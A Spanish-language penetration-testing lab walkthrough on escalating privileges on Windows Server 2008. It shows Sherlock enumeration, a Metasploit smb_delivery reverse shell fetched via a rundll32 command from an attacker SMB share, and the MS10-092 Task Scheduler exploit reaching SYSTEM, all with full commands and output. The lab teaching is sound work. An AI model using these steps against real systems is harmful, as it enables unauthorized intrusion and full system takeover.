---

Windows Server 2008/2008 R2 fueron declarados end-of-life el 14 de enero de 2020. A lo largo de los años, Microsoft ha añadido características de seguridad mejoradas a las versiones posteriores de Windows Server. No es muy común encontrar Server 2008 durante una prueba de penetración externa, pero a menudo lo encuentro durante evaluaciones internas.

---

## Server 2008 vs. Newer Versions

La tabla a continuación muestra algunas diferencias notables entre Server 2008 y las versiones más recientes de Windows Server.

| Feature | Server 2008 R2 | Server 2012 R2 | Server 2016 | Server 2019 |
|---|---|---|---|---|
| [Enhanced Windows Defender Advanced Threat Protection (ATP)](https://docs.microsoft.com/en-us/mem/configmgr/protect/deploy-use/defender-advanced-threat-protection) ||||X|
| [Just Enough Administration](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.1) | Partial | Partial | X | X |
| [Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard) |||X|X|
| [Remote Credential Guard](https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard) |||X|X|
| [Device Guard (code integrity)](https://techcommunity.microsoft.com/t5/iis-support-blog/windows-10-device-guard-and-credential-guard-demystified/ba-p/376419) |||X|X|
| [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview) | Partial | X | X | X |
| [Windows Defender](https://www.microsoft.com/en-us/windows/comprehensive-security) | Partial | Partial | X | X |
| [Control Flow Guard](https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard) |||X|X|

---

## Server 2008 Case Study

A menudo, durante mis evaluaciones, encuentro versiones antiguas del sistema operativo, tanto Windows como Linux. A veces, estos son sistemas olvidados que el cliente puede actuar rápidamente y desmantelar, mientras que otras veces, estos pueden ser sistemas críticos que no se pueden eliminar o reemplazar fácilmente. Los testers de penetración necesitan comprender el negocio principal del cliente y mantener discusiones durante la evaluación, especialmente cuando se trata de escaneo/enumeración y ataque a sistemas heredados, y durante la fase de informes. No todos los entornos son iguales, y debemos tener en cuenta muchos factores al escribir recomendaciones para hallazgos y asignar calificaciones de riesgo. Por ejemplo, en entornos médicos pueden estar ejecutando software crítico en Windows XP/7 o Windows Server 2003/2008. Sin entender la razón "por qué", no es suficiente decirles simplemente que eliminen los sistemas del entorno. Si están ejecutando software de MRI costoso que el proveedor ya no admite, podría costar grandes sumas de dinero la transición a nuevos sistemas. En este caso, tendríamos que observar otros controles de mitigación que el cliente tenga implementados, como la segmentación de la red, soporte extendido personalizado de Microsoft, etc.

Si estamos evaluando a un cliente con las últimas y mejores protecciones y encontramos un host Server 2008 que se pasó por alto, entonces podría ser tan simple como recomendar actualizar o desmantelar. Esto también podría ser el caso en entornos sujetos a requisitos de auditoría/regulación estrictos donde un sistema heredado podría obtener una "falla" o baja puntuación en su auditoría e incluso detener o hacer que pierdan fondos gubernamentales.

Vamos a echar un vistazo a un host Windows Server 2008 que podemos encontrar en un entorno médico, una gran universidad, o una oficina gubernamental local, entre otros.

Para un sistema operativo antiguo como Windows Server 2008, podemos usar un script de enumeración como [Sherlock](https://github.com/rasta-mouse/Sherlock) para buscar parches faltantes. También podemos usar algo como [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester), que toma los resultados del comando `systeminfo` como entrada y compara el nivel de parches del host contra la base de datos de vulnerabilidades de Microsoft para detectar posibles parches faltantes en el objetivo. Si existe un exploit en el framework de Metasploit para el parche faltante dado, la herramienta lo sugerirá. Otros scripts de enumeración pueden ayudarnos con esto, o incluso podemos enumerar el nivel de parches manualmente y realizar nuestra propia investigación. Esto puede ser necesario si hay limitaciones para cargar herramientas en el host objetivo o guardar la salida de comandos.

### Querying Current Patch Level

Primero usemos WMI para verificar los KBs faltantes.

```r
C:\htb> wmic qfe

Caption                                     CSName      Description  FixComments  HotFixID   InstallDate  InstalledBy               InstalledOn  Name  ServicePackInEffect  Status
http://support.microsoft.com/?kbid=2533552  WINLPE-2K8  Update                    KB2533552               WINLPE-2K8\Administrator  3/31/2021
```

Una búsqueda rápida en Google del último hotfix instalado nos muestra que este sistema está muy desactualizado.

### Running Sherlock

Ejecutemos Sherlock para recopilar más información.

```r
PS C:\htb> Set-ExecutionPolicy bypass -Scope process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic. Do you want to change the execution
policy?
[Y] Yes  [N] No  [S] Suspend  [?] Help (default is "Y"): Y


PS C:\htb> Import-Module .\Sherlock.ps1
PS C:\htb> Find-AllVulns

Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Appears Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/thttps://us-cert.cisa.gov/ncas/alerts/aa20-133aree/master/MS16-034?
VulnStatus : Not Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
VulnStatus : Not Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
VulnStatus : Not Vulnerable
```

### Obtaining a Meterpreter Shell

Desde la salida, podemos ver varios parches faltantes. Desde aquí, obtengamos una shell de Metasploit en el sistema e intentemos escalar privilegios utilizando uno de los CVEs identificados. Primero, necesitamos obtener una shell inversa de `Meterpreter`. Podemos hacer esto de varias maneras, pero una forma fácil es utilizando el módulo `smb_delivery`.

```r
msf6 exploit(windows/smb/smb_delivery) > search smb_delivery

Matching Modules
================
   #  Name                              Disclosure Date  Rank       Check  Description
   -  ----                              ---------------  ----       -----  -----------
   0  exploit/windows/smb/smb_delivery  2016-07-26       excellent  No     SMB Delivery
Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/smb_delivery


msf6 exploit(windows/smb/smb_delivery) > use 0

[*] Using configured payload windows/meterpreter/reverse_tcp


msf6 exploit(windows/smb/smb_delivery) > show options 

Module options (exploit/windows/smb/smb_delivery):
   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   FILE_NAME    test.dll         no        DLL file name
   FOLDER_NAME                   no        Folder name to share (Default none)
   SHARE                         no        Share (Default Random)
   SRVHOST      10.10.14.3       yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT      445              yes       The local port to listen on.
Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.3       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   1   PSH


msf6 exploit(windows/smb/smb_delivery) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   DLL
   1   PSH


msf6 exploit(windows/smb/smb_delivery) > set target 0

target => 0


msf6 exploit(windows/smb/smb_delivery) > exploit 
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 10.10.14.3:4444 
[*] Started service listener on 10.10.14.3:445 
[*] Server started.
[*] Run the following command on the target machine:
rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
```

### Rundll Command on Target Host

Abra una consola cmd en el host objetivo y pegue el comando `rundll32.exe`.

```r
C:\htb> rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
```

### Receiving Reverse Shell

Recibimos una llamada rápidamente.

```r
msf6 exploit(windows/smb/smb_delivery) > [*] Sending stage (175174 bytes) to 10.129.43.15
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.129.43.15:49609) at 2021-05-12 15:55:05 -0400
```

### Searching for Local Privilege Escalation Exploit

Desde aquí, busquemos el módulo [MS10_092 Windows Task Scheduler '.XML' Privilege Escalation](https://www.exploit-db.com/exploits/19930).

```r
msf6 exploit(windows/smb/smb_delivery) > search 2010-3338

Matching Modules
================
   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/windows/local/ms10_092_schelevator  2010-09-13       excellent  Yes    Windows Escalate Task Scheduler XML Privilege Escalation
   
   
msf6 exploit(windows/smb/smb_delivery) use 0
```

### Migrating to a 64-bit Process

Antes de usar el módulo en cuestión, necesitamos ingresar a nuestra shell de Meterpreter y migrar a un proceso de 64 bits, o el exploit no funcionará. También podríamos haber elegido un payload Meterpreter x64 durante el paso de `smb_delivery`.

```r
msf6 post(multi/recon/local_exploit_suggester) > sessions -i 1

[*] Starting interaction with 1...

meterpreter > getpid

Current pid: 2268


meterpreter > ps

Process List
============
 PID   PPID  Name               Arch  Session  User                    Path
 ---   ----  ----               ----  -------  ----                    ----
 0     0     [System Process]
 4     0     System
 164   1800  VMwareUser.exe     x86   2        WINLPE-2K8\htb-student  C:\Program Files (x86)\VMware\VMware Tools\VMwareUser.exe
 244   2032  winlogon.exe
 260   4     smss.exe
 288   476   svchost.exe
 332   324   csrss.exe
 376   324   wininit.exe
 476   376   services.exe
 492   376   lsass.exe
 500   376   lsm.exe
 584   476   mscorsvw.exe
 600   476   svchost.exe
 616   476   msdtc.exe
 676   476   svchost.exe
 744   476   taskhost.exe       x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\taskhost.exe
 756   1800  VMwareTray.exe     x86   2        WINLPE-2K8\htb-student  C:\Program Files (x86)\VMware\VMware Tools\VMwareTray.exe
 764   476   svchost.exe
 800   476   svchost.exe
 844   476   svchost.exe
 900   476   svchost.exe
 940   476   svchost.exe
 976   476   spoolsv.exe
 1012  476   sppsvc.exe
 1048  476   svchost.exe
 1112  476   VMwareService.exe
 1260  2460  powershell.exe     x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 1408  2632  conhost.exe        x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\conhost.exe
 1464  900   dwm.exe            x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\dwm.exe
 1632  476   svchost.exe
 1672  600   WmiPrvSE.exe
 2140  2460  cmd.exe            x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\cmd.exe
 2256  600   WmiPrvSE.exe
 2264  476   mscorsvw.exe
 2268  2628  rundll32.exe       x86   2        WINLPE-2K8\htb-student  C:\Windows\SysWOW64\rundll32.exe
 2460  2656  explorer.exe       x64   2        WINLPE-2K8\htb-student  C:\Windows\explorer.exe
 2632  2032  csrss.exe
 2796  2632  conhost.exe        x64   2        WINLPE-2K8\htb-student  C:\Windows\System32\conhost.exe
 2876  476   svchost.exe
 3048  476   svchost.exe
 
 
meterpreter > migrate 2796

[*] Migrating from 2268 to 2796...
[*] Migration completed successfully.


meterpreter > background

[*] Backgrounding session 1...
```

### Setting Privilege Escalation Module Options

Una vez configurado esto, ahora podemos configurar el módulo de escalación de privilegios especificando nuestra sesión actual de Meterpreter, estableciendo nuestra IP tun0 para LHOST y un puerto de llamada de nuestra elección.

```r
msf6 exploit(windows/local/ms10_092_schelevator) > set SESSION 1

SESSION => 1


msf6 exploit(windows/local/ms10_092_schelevator) > set lhost 10.10.14.3

lhost => 10.10.14.3


msf6 exploit(windows/local/ms10_092_schelevator) > set lport 4443

lport => 4443


msf6 exploit(windows/local/ms10_092_schelevator) > show options

Module options (exploit/windows/local/ms10_092_schelevator):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   CMD                        no        Command to execute instead of a payload
   SESSION   1                yes       The session to run this module on.
   TASKNAME                   no        A name for the created task (default random)
Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.3       yes       The listen address (an interface may be specified)
   LPORT     4443             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   0   Windows Vista, 7, and 2008
```

### Receiving Elevated Reverse Shell

Si todo sale según lo planeado, una vez que escribamos `exploit`, recibiremos una nueva shell de Meterpreter como la cuenta `NT AUTHORITY\SYSTEM` y podemos proceder a realizar cualquier post-explotación necesario.

```r
msf6 exploit(windows/local/ms10_092_schelevator) > exploit

[*] Started reverse TCP handler on 10.10.14.3:4443
[*] Preparing payload at C:\Windows\TEMP\uQEcovJYYHhC.exe
[*] Creating task: isqR4gw3RlxnplB
[*] SUCCESS: The scheduled task "isqR4gw3RlxnplB" has successfully been created.
[*] SCHELEVATOR
[*] Reading the task file contents from C:\Windows\system32\tasks\isqR4gw3RlxnplB...
[*] Original CRC32: 0x89b06d1a
[*] Final CRC32: 0x89b06d1a
[*] Writing our modified content back...
[*] Validating task: isqR4gw3RlxnplB
[*]
[*] Folder: \
[*] TaskName                                 Next Run Time          Status
[*] ======================================== ====================== ===============
[*] isqR4gw3RlxnplB                          6/1/2021 1:04:00 PM    Ready
[*] SCHELEVATOR
[*] Disabling the task...
[*] SUCCESS: The parameters of scheduled task "isqR4gw3RlxnplB" have been changed.
[*] SCHELEVATOR
[*] Enabling the task...
[*] SUCCESS: The parameters of scheduled task "isqR4gw3RlxnplB" have been changed.
[*] SCHELEVATOR
[*] Executing the task...
[*] Sending stage (175174 bytes) to 10.129.43.15
[*] SUCCESS: Attempted to run the scheduled task "isqR4gw3RlxnplB".
[*] SCHELEVATOR
[*] Deleting the task...
[*] Meterpreter session 2 opened (10.10.14.3:4443 -> 10.129.43.15:49634) at 2021-05-12 16:04:34 -0400
[*] SUCCESS: The scheduled task "isqR4gw3RlxnplB" was successfully deleted.
[*] SCHELEVATOR


meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM


meterpreter > sysinfo

Computer        : WINLPE-2K8
OS              : Windows 2008 R2 (6.1 Build 7600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x86/windows
```

---

## Attacking Server 2008

Tomando los ejemplos de enumeración que hemos pasado en este módulo, acceda al sistema a continuación, encuentre una forma de escalar a acceso de nivel `NT AUTHORITY\SYSTEM` (puede haber más de una forma), y envíe el archivo `flag.txt` en el escritorio del Administrador. Desafíese a escalar privilegios de múltiples maneras y no simplemente reproduzca la escalación de privilegios del Task Scheduler detallada anteriormente.